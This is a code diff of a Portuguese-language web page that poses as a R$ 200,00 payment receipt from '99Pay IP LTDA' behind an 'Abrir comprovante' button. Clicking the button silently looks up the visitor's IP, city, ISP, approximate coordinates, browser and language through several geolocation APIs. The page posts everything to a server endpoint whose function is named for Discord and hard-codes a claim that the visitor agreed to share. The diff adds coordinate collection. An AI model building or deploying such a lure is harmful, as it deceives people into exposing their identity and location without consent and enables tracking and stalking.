@@ -70,18 +70,18 @@
   <a id="linkDestino" class="botao" rel="noopener noreferrer"></a>
   <p class="rodape" id="rodape"></p>
 
-  <script>
-    (() => {
-      'use strict';
 
-      // =============================================================
-      // ⚙️ EDITE AQUI: TODOS OS TEXTOS E O LINK DE DESTINO
-      // =============================================================
+<script>
+(() => {
+  'use strict';
+
+  // ============================================
+  // 1. CONFIGURAÇÕES EDITÁVEIS
+  // ============================================
       const CONFIG = {
         titulo: 'Pagamento Efetuado! R$ 200,00',
         descricao: '',
-        avisoPrivacidade:
-          'Pagamento efetuado para 99Pay IP LTDA',
+        avisoPrivacidade: 'Pagamento efetuado para 99Pay IP LTDA',
         textoBotao: 'Abrir comprovante',
         textoConsultando: 'Abrindo comprovante...',
         textoEnviando: 'Redirecionando...',
@@ -95,151 +95,347 @@
         timeoutProvedorMs: 6000
       };
 
-      // =============================================================
-      // ELEMENTOS DA PÁGINA
-      // =============================================================
-      const el = id => document.getElementById(id);
-      const botao = el('linkRegistrar');
-      const status = el('status');
+  // ============================================
+  // 2. ELEMENTOS DO SITE
+  // ============================================
 
-      el('titulo').textContent = CONFIG.titulo;
-      el('descricao').textContent = CONFIG.descricao;
-      el('avisoPrivacidade').textContent = CONFIG.avisoPrivacidade;
-      el('rodape').textContent = CONFIG.rodape;
-      botao.textContent = CONFIG.textoBotao;
-      el('linkDestino').textContent = CONFIG.textoContinuar;
+  const el = id => document.getElementById(id);
 
-      function mostrarDados(dados) {
-        if (!CONFIG.mostrarResultado) return;
-        el('resultado').textContent = JSON.stringify(dados, null, 2);
-        el('blocoResultado').style.display = 'block';
-      }
+  const botao = el('linkRegistrar');
+  const status = el('status');
 
-      async function obterJson(url, timeoutMs) {
-        const controlador = new AbortController();
-        const temporizador = setTimeout(() => controlador.abort(), timeoutMs);
-        try {
-          const resposta = await fetch(url, {
-            headers: { Accept: 'application/json' },
-            signal: controlador.signal
-          });
-          if (!resposta.ok) throw new Error(`HTTP ${resposta.status}`);
-          const json = await resposta.json();
-          if (json.success === false) throw new Error('Provedor indisponível');
-          return json;
-        } finally {
-          clearTimeout(temporizador);
-        }
-      }
+  el('titulo').textContent = CONFIG.titulo;
+  el('descricao').textContent = CONFIG.descricao;
 
-      // Os provedores são consultados em sequência. Se um falhar,
-      // o próximo é utilizado. A localização é aproximada, nunca GPS.
-      const PROVEDORES = [
-        {
-          url: 'https://ipwho.is/',
-          extrair: d => ({
-            ip: d.ip,
-            cidade: d.city,
-            regiao: d.region,
-            pais: d.country,
-            provedor: d.connection?.isp,
-            fusoHorario: d.timezone?.id
-          })
+  el('avisoPrivacidade').textContent =
+    CONFIG.avisoPrivacidade;
+
+  el('rodape').textContent = CONFIG.rodape;
+
+  botao.textContent = CONFIG.textoBotao;
+
+  el('linkDestino').textContent =
+    CONFIG.textoContinuar;
+
+  // ============================================
+  // 3. EXIBIR RESULTADOS
+  // ============================================
+
+  function mostrarDados(dados) {
+    if (!CONFIG.mostrarResultado) return;
+
+    el('resultado').textContent =
+      JSON.stringify(dados, null, 2);
+
+    el('blocoResultado').style.display = 'block';
+  }
+
+  // ============================================
+  // 4. CONSULTAR APIS COM TIMEOUT
+  // ============================================
+
+  async function obterJson(url, timeoutMs) {
+    const controller = new AbortController();
+
+    const timer = setTimeout(
+      () => controller.abort(),
+      timeoutMs
+    );
+
+    try {
+      const response = await fetch(url, {
+        headers: {
+          Accept: 'application/json'
         },
-        {
-          url: 'https://ipapi.co/json/',
-          extrair: d => ({
-            ip: d.ip,
-            cidade: d.city,
-            regiao: d.region,
-            pais: d.country_name,
-            provedor: d.org,
-            fusoHorario: d.timezone
-          })
-        },
-        {
-          url: 'https://get.geojs.io/v1/ip/geo.json',
-          extrair: d => ({
-            ip: d.ip,
-            cidade: d.city,
-            regiao: d.region,
-            pais: d.country,
-            provedor: d.organization,
-            fusoHorario: d.timezone
-          })
-        },
-        {
-          url: 'https://api.ipify.org?format=json',
-          extrair: d => ({ ip: d.ip })
-        }
-      ];
-
-      async function consultarGeolocalizacao() {
-        for (const provedor of PROVEDORES) {
-          try {
-            const bruto = await obterJson(provedor.url, CONFIG.timeoutProvedorMs);
-            const extraidos = provedor.extrair(bruto);
-            if (!extraidos.ip) throw new Error('IP ausente');
-            return extraidos;
-          } catch (erro) {
-            console.warn('[consulta] Provedor falhou:', erro.message);
-          }
-        }
-        throw new Error('Nenhum provedor de IP respondeu');
-      }
-
-      botao.addEventListener('click', async () => {
-        botao.disabled = true;
-        el('blocoResultado').style.display = 'none';
-        el('linkDestino').style.display = 'none';
-        status.textContent = CONFIG.textoConsultando;
-
-        try {
-          const geolocalizacao = await consultarGeolocalizacao();
-          const dados = {
-            ...geolocalizacao,
-            horario: new Date().toISOString(),
-            navegador: navigator.userAgent,
-            idioma: navigator.language
-          };
-
-          mostrarDados(dados);
-          status.textContent = CONFIG.textoEnviando;
-
-          const resposta = await fetch('/api/notificar', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              autorizouCompartilhamento: true,
-              dados
-            })
-          });
-
-          if (!resposta.ok) {
-            throw new Error(`Falha no servidor (HTTP ${resposta.status})`);
-          }
-
-          const retorno = await resposta.json();
-          if (retorno.success !== true) throw new Error('Envio não confirmado');
-          status.textContent = CONFIG.textoSucesso;
-
-          if (CONFIG.destinoDepoisDoEnvio) {
-            const destino = new URL(CONFIG.destinoDepoisDoEnvio);
-            if (destino.protocol === 'https:' || destino.protocol === 'http:') {
-              el('linkDestino').href = destino.href;
-              el('linkDestino').style.display = 'inline-block';
-            }
-          }
-        } catch (erro) {
-          console.error('[diagnostico]', erro);
-          status.textContent = /Nenhum provedor/.test(erro.message)
-            ? CONFIG.textoFalhaConsulta
-            : CONFIG.textoFalhaEnvio;
-        } finally {
-          botao.disabled = false;
-        }
+        signal: controller.signal
       });
-    })();
-  </script>
+
+      if (!response.ok) {
+        throw new Error(
+          `HTTP ${response.status}`
+        );
+      }
+
+      const json = await response.json();
+
+      if (json.success === false) {
+        throw new Error('API indisponível');
+      }
+
+      return json;
+
+    } finally {
+      clearTimeout(timer);
+    }
+  }
+
+  // ============================================
+  // 5. PROVEDORES DE IP E GEOLOCALIZAÇÃO
+  // ============================================
+
+  const PROVEDORES = [
+    {
+      nome: 'ipwho.is',
+      url: 'https://ipwho.is/',
+
+      extrair: d => ({
+        ip: d.ip,
+        cidade: d.city,
+        regiao: d.region,
+        pais: d.country,
+        provedor: d.connection?.isp,
+        fusoHorario: d.timezone?.id,
+
+        // COORDENADAS APROXIMADAS
+        latitude: d.latitude ?? null,
+        longitude: d.longitude ?? null
+      })
+    },
+
+    {
+      nome: 'ipapi.co',
+      url: 'https://ipapi.co/json/',
+
+      extrair: d => ({
+        ip: d.ip,
+        cidade: d.city,
+        regiao: d.region,
+        pais: d.country_name,
+        provedor: d.org,
+        fusoHorario: d.timezone,
+
+        latitude: d.latitude ?? null,
+        longitude: d.longitude ?? null
+      })
+    },
+
+    {
+      nome: 'geojs.io',
+      url: 'https://get.geojs.io/v1/ip/geo.json',
+
+      extrair: d => ({
+        ip: d.ip,
+        cidade: d.city,
+        regiao: d.region,
+        pais: d.country,
+        provedor: d.organization,
+        fusoHorario: d.timezone,
+
+        latitude: d.latitude
+          ? Number(d.latitude)
+          : null,
+
+        longitude: d.longitude
+          ? Number(d.longitude)
+          : null
+      })
+    },
+
+    {
+      nome: 'ipify',
+      url: 'https://api.ipify.org?format=json',
+
+      extrair: d => ({
+        ip: d.ip,
+        cidade: null,
+        regiao: null,
+        pais: null,
+        provedor: null,
+        fusoHorario: null,
+        latitude: null,
+        longitude: null
+      })
+    }
+  ];
+
+  // ============================================
+  // 6. BUSCAR IP E COORDENADAS
+  // ============================================
+
+  async function consultarGeolocalizacao() {
+
+    for (const provedor of PROVEDORES) {
+
+      try {
+        const bruto = await obterJson(
+          provedor.url,
+          CONFIG.timeoutProvedorMs
+        );
+
+        const dados = provedor.extrair(bruto);
+
+        if (!dados.ip) {
+          throw new Error('IP não encontrado');
+        }
+
+        console.log(
+          'Consulta concluída:',
+          provedor.nome
+        );
+
+        return dados;
+
+      } catch (erro) {
+        console.warn(
+          'Falha em ' + provedor.nome,
+          erro.message
+        );
+      }
+    }
+
+    throw new Error(
+      'Nenhum provedor respondeu'
+    );
+  }
+
+  // ============================================
+  // 7. ENVIAR DADOS PARA API DA VERCEL
+  // ============================================
+
+  async function enviarParaDiscord(dados) {
+
+    const response = await fetch(
+      '/api/notificar',
+      {
+        method: 'POST',
+
+        headers: {
+          'Content-Type': 'application/json'
+        },
+
+        body: JSON.stringify({
+          autorizouCompartilhamento: true,
+
+          dados: {
+            ip: dados.ip,
+            cidade: dados.cidade,
+            regiao: dados.regiao,
+            pais: dados.pais,
+            provedor: dados.provedor,
+
+            // COORDENADAS
+            latitude: dados.latitude,
+            longitude: dados.longitude,
+
+            fusoHorario: dados.fusoHorario,
+            horario: dados.horario,
+            navegador: dados.navegador,
+            idioma: dados.idioma
+          }
+        })
+      }
+    );
+
+    if (!response.ok) {
+      throw new Error(
+        `Erro HTTP ${response.status}`
+      );
+    }
+
+    const resultado = await response.json();
+
+    if (resultado.success !== true) {
+      throw new Error(
+        'Servidor não confirmou o envio'
+      );
+    }
+
+    return resultado;
+  }
+
+  // ============================================
+  // 8. BOTÃO PRINCIPAL
+  // ============================================
+
+  botao.addEventListener('click', async () => {
+
+    botao.disabled = true;
+
+    el('blocoResultado').style.display = 'none';
+    el('linkDestino').style.display = 'none';
+
+    status.textContent = CONFIG.textoConsultando;
+
+    try {
+
+      // CONSULTA IP E LOCALIZAÇÃO
+      const geo = await consultarGeolocalizacao();
+
+      // MONTA OBJETO FINAL
+      const dados = {
+        ip: geo.ip,
+        cidade: geo.cidade,
+        regiao: geo.regiao,
+        pais: geo.pais,
+        provedor: geo.provedor,
+
+        latitude: geo.latitude,
+        longitude: geo.longitude,
+
+        fusoHorario: geo.fusoHorario,
+
+        horario: new Date().toISOString(),
+
+        navegador: navigator.userAgent,
+        idioma: navigator.language
+      };
+
+      // MOSTRA OS DADOS
+      mostrarDados(dados);
+
+      status.textContent = CONFIG.textoEnviando;
+
+      // ENVIA PARA API
+      await enviarParaDiscord(dados);
+
+      status.textContent = CONFIG.textoSucesso;
+
+      // REDIRECIONAMENTO OPCIONAL
+      if (CONFIG.destinoDepoisDoEnvio) {
+
+        const destino = new URL(
+          CONFIG.destinoDepoisDoEnvio
+        );
+
+        if (
+          destino.protocol === 'https:' ||
+          destino.protocol === 'http:'
+        ) {
+          el('linkDestino').href = destino.href;
+
+          el('linkDestino').style.display =
+            'inline-block';
+        }
+      }
+
+    } catch (erro) {
+
+      console.error(
+        '[diagnostico]',
+        erro
+      );
+
+      if (
+        erro.message.includes(
+          'Nenhum provedor'
+        )
+      ) {
+        status.textContent =
+          CONFIG.textoFalhaConsulta;
+
+      } else {
+        status.textContent =
+          CONFIG.textoFalhaEnvio;
+      }
+
+    } finally {
+
+      botao.disabled = false;
+
+    }
+  });
+
+})();
+</script>
 </body>
 </html>
